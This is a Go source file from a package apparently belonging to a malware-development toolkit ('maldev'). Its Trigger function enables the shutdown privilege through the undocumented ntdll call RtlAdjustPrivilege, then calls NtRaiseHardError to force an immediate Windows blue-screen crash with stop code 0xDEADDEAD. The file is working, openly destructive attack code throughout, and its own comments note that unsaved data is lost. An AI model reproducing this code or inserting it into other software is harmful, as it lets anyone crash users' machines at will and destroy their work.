package bsod

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
)

var (
	procRtlAdjustPrivilege = api.Ntdll.NewProc("RtlAdjustPrivilege")
	procNtRaiseHardError   = api.Ntdll.NewProc("NtRaiseHardError")
)

// seShutdownPrivilege is the privilege index required to shut down the system.
const seShutdownPrivilege = 19

// Trigger causes an immediate Blue Screen of Death.
// This is a DESTRUCTIVE operation — the system will crash immediately
// with no opportunity to save data.
//
// The error code 0xDEADDEAD is used as the BSOD stop code.
// This function does not return on success.
func Trigger() error {
	// Enable SeShutdownPrivilege (index 19) for the current process.
	var wasEnabled int32
	r1, _, _ := procRtlAdjustPrivilege.Call(
		seShutdownPrivilege,
		1, // enable
		0, // current process (not thread)
		uintptr(unsafe.Pointer(&wasEnabled)),
	)
	if r1 != 0 {
		return fmt.Errorf("privilege elevation failed: NTSTATUS 0x%X", uint32(r1))
	}

	// Raise a fatal hard error — option 6 = shutdown system.
	var response uint32
	r1, _, _ = procNtRaiseHardError.Call(
		0xDEADDEAD, // error code (appears in crash dump)
		0,          // number of parameters
		0,          // unicode string mask
		0,          // parameters (none)
		6,          // response option: OptionShutdownSystem
		uintptr(unsafe.Pointer(&response)),
	)
	if r1 != 0 {
		return fmt.Errorf("hard error failed: NTSTATUS 0x%X", uint32(r1))
	}

	return nil
}
